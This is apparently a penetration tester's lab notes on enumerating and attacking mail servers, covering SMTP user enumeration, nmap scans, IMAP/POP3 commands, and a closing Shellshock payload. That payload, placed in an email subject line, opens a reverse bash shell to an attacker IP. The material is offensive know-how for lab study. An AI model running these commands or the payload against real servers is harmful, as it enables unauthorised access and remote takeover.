## SMTP Methodology

1. Can you login?  Check for emails!
2. Is it vulnerable to anything?
3. Enumerate users if needed

### Enumerate users

Manually:

```bash
telnet SERVER 25
VRFY USER1
# If user exists:  252 2.0.0 root
# If use doesn't exist:  550 5.1.1 <scooby>: Recipient address rejected: User unknown in local recipient table
```

Automatic:

With many smtp servers, there's a large delay on login that breaks most enumeration scripts.  You can try these, but only one dealt with that delay.

```bash
# Python script that deals with delay
/home/coyote/.local/bin/smtp-user-enum -U /usr/share/fern-wifi-cracker/extras/wordlists/common.txt 10.10.10.17 25 > smtp_enum.txt
# Check for matches
grep 252 smtp_enum.txt

# Pentestmonkey, delay breaks it
smtp-user-enum -M VRFY -U /usr/share/fern-wifi-cracker/extras/wordlists/common.txt -t 10.10.10.17

# nmap, delay breaks it
nmap -p25 --script smtp-enum-users.nse SERVER
```

### Mail Footprinting

```bash
sudo nmap 10.129.40.107 -sV -p110,143,993,995 -sC
```

### SMTP Commands:

Identify Server

```bash
EHLO DOMAIN.com
```

Send Mail

```bash
MAIL FROM:<coyote@admin.local>
RCPT TO:<root@admin.local> NOTIFY=success,failure
DATA
Subject: Test Subj
#<PRESS ENTER TWICE>
This is a test message
.
```

Connecting through Web Proxy

```bash
CONNECT 10.129.14.128:25 HTTP/1.0
```

Nmap scans

```bash
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```

### IMAP Commands:

I think the number in front of the command is an identifier, so you can send multiple commands back to back if you increment that ID

| **Command**                     | **Description**                                              |
| ------------------------------- | ------------------------------------------------------------ |
| `1 LOGIN username password`     | User's login.                                                |
| `1 LIST "" *`                   | Lists all directories.                                       |
| `1 CREATE "INBOX"`              | Creates a mailbox with a specified name.                     |
| `1 DELETE "INBOX"`              | Deletes a mailbox.                                           |
| `1 RENAME "ToRead" "Important"` | Renames a mailbox.                                           |
| `1 LSUB "" *`                   | Returns a subset of names from the set of names that the User has declared as being `active` or `subscribed`. |
| `1 SELECT INBOX`                | Selects a mailbox so that messages in the mailbox can be accessed. |
| `1 UNSELECT INBOX`              | Exits the selected mailbox.                                  |
| `1 FETCH <ID> all`              | Retrieves data associated with a message in the mailbox (number is just the number of messages.  If 1 message, use 1). |
| `1 FETCH <ID> BODY[TEXT]`       | Retrieve the body of a message                               |
| `1 CLOSE`                       | Removes all messages with the `Deleted` flag set.            |
| `1 LOGOUT`                      | Closes the connection with the IMAP server.                  |

#### Connecting to IMAP

```bash
# Curl
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd 
# Use -v for verbose to see more info

# openssl
openssl s_client -connect 10.129.14.128:imaps

# 
```



### POP Commands:

| **Command**     | **Description**                                             |
| --------------- | ----------------------------------------------------------- |
| `USER username` | Identifies the user.                                        |
| `PASS password` | Authentication of the user using its password.              |
| `STAT`          | Requests the number of saved emails from the server.        |
| `LIST`          | Requests from the server the number and size of all emails. |
| `RETR id`       | Requests the server to deliver the requested email by ID.   |
| `DELE id`       | Requests the server to delete the requested email by ID.    |
| `CAPA`          | Requests the server to display the server capabilities.     |
| `RSET`          | Requests the server to reset the transmitted information.   |
| `QUIT`          | Closes the connection with the POP3 server.                 |

#### Connecting to POP3 over SSL

```bash
# openssl
openssl s_client -connect 10.129.14.128:pop3s

# 
```



Check mail Example

```bash
telnet 10.10.10.51 110
user USERNAME
pass PASSWORD
list # List messages
retr N	# View message N
dele N  # Delete message N
```

### Shellshock

Postfix versions 4.2.x < 4.2.48 are vulnerable to RCE (ShellShock).  You can use the script [here](https://www.exploit-db.com/exploits/34896) or just craft an email manually through Telnet:

```bash
# Include this in the subject line of the email:
Subject:() { :; };bash -i >& /dev/tcp/10.10.14.29/8000 0>&1
```

